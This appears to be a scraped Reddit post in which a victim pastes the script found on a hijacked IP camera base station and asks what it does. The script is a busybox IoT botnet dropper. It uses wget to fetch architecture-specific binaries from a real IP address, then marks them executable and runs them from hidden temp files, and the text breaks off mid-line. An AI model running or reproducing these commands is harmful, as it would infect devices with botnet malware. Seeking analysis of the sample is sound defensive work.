# Source:Hackers, URL:https://www.reddit.com/r/hackers/.rss, language:en

## My IP camera base station's DDNS has been hijacked to wget a .ru russian domain, can anybody explain what the code is trying to acheive (looks to me like a busybox linux malware)?
 - [https://www.reddit.com/r/hackers/comments/1hn14sc/my_ip_camera_base_stations_ddns_has_been_hijacked](https://www.reddit.com/r/hackers/comments/1hn14sc/my_ip_camera_base_stations_ddns_has_been_hijacked)
 - RSS feed: $source
 - date published: 2024-12-26T23:29:46+00:00

<!-- SC_OFF --><div class="md"><p>&gt;/tmp/.a &amp;&amp; cd /tmp;</p> <p>&gt;/dev/.a &amp;&amp; cd /dev;</p> <p>&gt;/dev/shm/.a &amp;&amp; cd /dev/shm;</p> <p>&gt;/var/tmp/.a &amp;&amp; cd /var/tmp;</p> <p>&gt;/var/.a &amp;&amp; cd /var;</p> <p>&gt;/home/.a &amp;&amp; cd /home;</p> <p>for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d &#39; &#39; -f 2`; do &gt;$path/.a &amp;&amp; cd $path; rm -rf .a .f;done;</p> <p>(cp /proc/self/exe .f || busybox cp /bin/busybox .f); &gt; .f; (chmod 777 .f || busybox chmod 777 .f);</p> <p>(wget <a href="http://5.230.228.134/vv/armv4l">http://5.230.228.134/vv/armv4l</a> -O- || busybox wget <a href="http://5.230.228.134/vv/armv4l">http://5.230.228.134/vv/armv4l</a> -O-) &gt; .f; chmod 777 .f; ./.f funny; &gt; .f; # ; rm -rf .f;</p> <p>(wget <a href="http://5.230.228.134/vv/armv5l">http://5.230.228.134/vv/armv5l</a> -O- || busybox wget <a href="http://5.230.228.134/vv/armv5l">http://5.230.228.134/vv/armv5l</a> -O-) &gt; .f; c

